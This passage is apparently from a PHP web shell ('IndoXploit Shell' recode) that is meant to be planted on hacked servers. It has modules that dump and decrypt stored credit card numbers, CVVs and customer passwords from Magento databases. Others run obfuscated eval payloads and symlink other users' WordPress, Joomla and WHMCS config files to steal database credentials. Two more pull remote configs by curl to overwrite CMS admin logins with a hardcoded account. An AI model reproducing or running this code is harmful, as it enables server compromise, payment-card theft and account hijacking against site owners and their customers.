                ====================================================================<br>  
                                [ Credit Card ] <br>  
                ====================================================================<br>';  
            echo "  
            <table border='1' align='left' >  
            <tr>  
            <td>no</td>  
            <td>Date</td>  
            <td>Credit Owner</td>  
            <td>method</td>  
            <td>Credit Number</td>  
            <td>Credit Exp</td>  
            <td>CVV</td>  
            <td>Address</td>  
            </tr>";  
                $no = 1;  
                $batas = 0;  
                while($vx = mysql_fetch_array($query)){  
                $date = $vx['updated_at'];  
                $cc_owner = $vx['cc_owner'];  
                $method = $vx['method'];  
                $cc_number_enc = $crypto->decrypt($vx['cc_number_enc']);  
                $exp = $vx['exp'];          
                $cc_cid_enc = $crypto->decrypt($vx['cc_cid_enc']);      
                $Billing_Address = $vx['Billing Address'];  
                echo "<tr><pre><td>$no</td><td>$date</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_enc</td><td>$Billing_Address</td></pre></tr>";  
                $batas = $no++;  
                }  
                  
                while($vx2 = mysql_fetch_array($query2)){  
                    $batas +=1;  
                $cc_owner = $vx2['cc_owner'];  
                $method = $vx2['method'];  
                $cc_number_enc = $crypto->decrypt($vx2['cc_number_enc']);  
                $exp = $vx2['exp'];          
                $cc_cid_status = $crypto->decrypt($vx2['cc_cid_status']);  
                $Billing_Address = $vx2['Billing Address'];  
                echo "<tr><pre><td>$batas</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_status</td><td>$Billing_Address</td></pre></tr>";  
                 $batas++;  
                }       
                  
            echo "</table><br>";      
    }  
    //=========================================================================================================  
    $query = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12");  
    $query2 = mysql_query("SELECT customer_email,password_hash FROM sales_flat_quote");  
      
      
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0 ){  
        if (!$query){  
              echo "<center><b>Gagal</b></center>";  
        }else{  
              echo'<br><br>  
                    ====================================================================<br>  
                                    [ Customer ] <br>  
                    ====================================================================<br>';  
        }  
        echo "  
        <table border='1' align='center' >  
        <tr>  
        <td>no</td>  
        <td>user</td>  
        <td>pass</td>      
        </tr>";  
            $no = 1;  
            $batas = 0;  
            while($vx = mysql_fetch_array($query)) {  
                $user = $vx['email'];  
                $pass = $vx['value'];  
                echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";  
                $batas = $no++;  
            }   
              
            if(mysql_num_rows($query2) != 0 && ($query2)){  
                while($vx2 = mysql_fetch_array($query2)){  
                    $user = $vx2['customer_email'];  
                    $pass = $crypto->decrypt($vx2['password_hash']);  
                    if(!empty($user) && !empty($pass)){ //tampilin ketika datanya itu ada klo gk ada ya jangan di tampiin   
                        $batas +=1;  
                        echo "<tr><pre><td>$batas</td><td>$user</td><td>$pass</td></pre></tr>";  
                        $batas++;  
                    }  
                }                  
            }  
          
        echo "</table><br>";  
    }  
    //=========================================================================================================  
  }  
}  
function save($format,$data){  
    $fp = fopen($format, 'a');  
    fwrite($fp, $data);  
    fclose($fp);  
}  
function cekbase64($string){   
        $decoded = base64_decode($string, true);  
        if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) return false;  
        if(!base64_decode($string, true)) return false;  
        if(base64_encode($decoded) != $string) return false;  
        return true;//nilai return 1 jika true  
    }  
//----untuk decode password ---/  
class Varien_Crypt_Mcrypt{  
    /**  
     * Constuctor  
     *  
     * @param array $data  
     */  
    public function __construct()  
    {  
    }  

    /**  
     * Initialize mcrypt module  
     *  
     * @param string $key cipher private key  
     * @return Varien_Crypt_Mcrypt  
     */  
    public function init($key)  
    {  
        $this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');  
        $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);  
        $maxKeySize = mcrypt_enc_get_key_size($this->handler);  

        if (iconv_strlen($key, 'UTF-8')>$maxKeySize) {  
            //throw new Varien_Exception('Maximum key size must should be smaller '.$maxKeySize);  
            return null;  
        }  

        mcrypt_generic_init($this->handler, $key, $iv);  

        return $this;  
    }  

    /**  
     * Encrypt data  
     *  
     * @param string $data source string  
     * @return string  
     */  
    public function encrypt($data)  
    {  
        if (!$this->handler) {  
            //throw new Varien_Exception('Crypt module is not initialized.');  
            return null;  
        }  
        if (strlen($data) == 0) {  
            return $data;  
        }  
        return base64_encode(mcrypt_generic($this->handler, $data));  
    }  

    /**  
     * Decrypt data  
     *  
     * @param string $data encrypted string  
     * @return string  
     */  
    public function decrypt($data)  
    {  
        if (!$this->handler) {  
            //throw new Varien_Exception('Crypt module is not initialized.');  
            return null;  
        }  
        if (strlen($data) == 0) {  
            return $data;  
        }  
        return mdecrypt_generic($this->handler, base64_decode($data));  
    }  
          
   
    /**  
     * Desctruct cipher module  
     *  
     */  
    public function __destruct()  
    {  
        if ($this->handler) {  
            $this->_reset();  
        }  
    }  

    protected function _reset()  
    {  
        mcrypt_generic_deinit($this->handler);  
        mcrypt_module_close($this->handler);  
    }  
}  	
}
elseif($_GET['do'] == 'zip') {
	echo "<center><h1>Zip Menu</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
	$filename = $_FILES["zip_file"]["name"];
	$source = $_FILES["zip_file"]["tmp_name"];
	$type = $_FILES["zip_file"]["type"];
	$name = explode(".", $filename);
	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$okay = true;
			break;
		} 
	}
	$continue = strtolower($name[1]) == 'zip' ? true : false;
	if(!$continue) {
		$message = "Itu Bukan Zip  , , GOBLOK COK";
	}
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
	if(move_uploaded_file($source, $targetzip)) {
		$zip = new ZipArchive();
		$x = $zip->open($targetzip); 
		if ($x === true) {
			$zip->extractTo($targetdir);
			$zip->close();
 
			unlink($targetzip);
		}
		$message = "<b>Sukses Gan :)</b>";
	} else {	
		$message = "<b>Error Gan :(</b>";
	}
}	
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/tkc_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";	
	if($_POST['backup']){ 
	$save=$_POST['save'];
	function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
	Zip($_POST['dir'],$save);
	echo "Done , Save To <b>$save</b>";
	}
	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/tkc_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zip = new ZipArchive;
	$res = $zip->open($_POST['dir']);
	if ($res === TRUE) {
		$zip->extractTo($save);
		$zip->close();
	echo 'Succes , Location : <b>'.$save.'</b>';
	} else {
	echo 'Gagal Mas :( Ntahlah !';
	}
	}
echo '</tr></table>';	
	}
	elseif($_GET['do'] == 'shellchk') {
		eval(str_rot13(gzinflate(str_rot13(base64_decode(('vUdaQttAED03Rf7DsE+KkdKED2QoxBYFJaiXV6Soh1Mo2t3uroF1cI9wt+uK/95Mx2kdKIceqJXIXvu9mTezYgf6PVllAXmSIDeoon5ikglIArclhixGciK4sXbKwCamEDxxDFc0uVVQJoU2zDMMPhqr0IJnNsFcuBRIyGVw5NlrnKgjOU07sdFFmEQiyrHO0bmRzCWr08TKMVWE0+HR0Sko8UAPh9Fx3MSNJni1/RdcxgYSdLUOmY7XeMMZmJXEd0gWpgk5q0r31sW0vCUCXAnnGIX1BVPsvN/Lb14VBRs0WC9qqZBHZY3LUaQY7JscVtsB/Or3gK79HC2VpiHcMrarFmleo7SxJvYgkqSNChra4vBhCB+GY9IiJYGkSJSP+C/i5NRfAuCjZ17N4HkwJMpv4N8P7mlgvnWCSc+Upv5HcRC0d084Pjx5WKmY94UujEOeuJzNp5/m0wWbzr9dXs+Xn2JhpjPWBKrQP+I0aYRy1f6dTi0XSxe0FunqJaYL8aL2sJRz1Ra8o8pfF6UtXMDs98JkbbLHJxcb/8rbhw14KcN6toNB7KeOkgdIGIynXmSjZwSs39uRm+X0ORMSbMBlqymDbDSUgUzWjZtIwQKCD/8EHgJ6riNz++agy6nPFW4E31FnqrjxHhcqvEiIPPoib55tM2VQnqxu8B4mFmWFmT91o65l8rlIcbtjuWmW/4yefZ6Mq3AC46gp8AnQdnzmgdN0HmtdJXJW6iw1nbJrPnz1k4JbBzNH96hgrhSZde/teNkx7z/vr7altPn/2GCFdvREGGv7Le736Oe3uNAaWrC/vLqcXS8G2+lUM6IzunUy6M408Z2iTXgCcnUnV1qoJqd0S6XsKnUqp+GJNsnJR9uISWJw77iqMl01vvZ1FrCX5/uVgcsqEvvLka5iaM+rJjSdn6FQeou2wb45BH/3Gw=='))))));
	} elseif($_GET['do'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}	
elseif($_GET['do'] == 'metu') {
	

echo '<form action="?dir=$dir&do=metu" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Byee !';
	
}
elseif($_GET['do'] == 'about') {
	
    echo '<center>Mr.ToKeiChun69 Shell<hr>IndoXploit Shell Recoded By Mr.ToKeiChun59<br><a href="https://www.facebook.com/tokeichun">Here</a>';
}
elseif($_GET['do'] == 'symlink404') {
echo "<center>
<form method='post'>
<br>File Target: <input type='text' name='dir' size='50' value='/home/user/public_html/wp-config.php'>
<br>Save As: <input type='text' name='jnck' size='50' value='config404.txt'><br><input name='sym404' type='submit' value='Eksekusi Gan'></form><br>";
@error_reporting(0);
@ini_set('display_errors', 0);
if($_POST['sym404']){
rmdir("sym404");mkdir("sym404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." sym404/".$jnck);
symlink($dir,"sym404/".$jnck);
$inija = fopen("sym404/.htaccess", "w");
fwrite($inija,"Options Indexes FollowSymLinks
DirectoryIndex tokeichun.html
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any

ReadmeName ".$jnck);
echo'<a href="sym404/">Succes! >:(</a>';
}
	
}
elseif($_GET['do'] == 'auto_cu_wp') {
if($_POST['gass']) {
	echo "<center><h1>WordPress Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' style='width: 450px; height:250px;'>";
	UrlLoop($_POST['linkconf'],'wordpress');	
	echo"</textarea><br>
		<input type='submit' style='width: 450px;' name='auto_cu_wp' value='Hajar!!'>
		</form></center>";
}	else {
		echo "<center><h1>WordPress Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/config/'><br>
		<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
		</form></center>";
	}
if($_POST['auto_cu_wp']) {
	
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$user = "heninoor27";
		$pass = "heninoor27";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "<font color=blue>[</font> $target <font color=blue>]</font></font><br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    
            	mysql_close($conn);
			}
		}
	} 	

}
elseif($_GET['do'] == 'auto_cu_joomla') {
if($_POST['gass']) {
	echo "<center><h1>Joomla Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' style='width: 450px; height:250px;'>";
	UrlLoop($_POST['linkconf'],'joomla');	
	echo"</textarea><br>
		<input type='submit' style='width: 450px;' name='auto_cu_joomla' value='Hajar!!'>
		</form></center>";
}	else {
		echo "<center><h1>Joomla Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/config/'><br>
		<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
		</form></center>";
	}
if($_POST['auto_cu_joomla']) {
	
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$user = "heninoor27";
		$pass = "heninoor27";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
					echo "Config => ".$dir_config."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => Done , Username : <font color=lime>$user</font> Password : <font color=lime>$pass</font><br><br>";
					}
					mysql_close($conn);
					}
	} 	
}
elseif($_GET['do'] == 'symconfig') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
@mkdir("config", 0777);
@chdir("config");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex tokeichun.html
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/','config/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
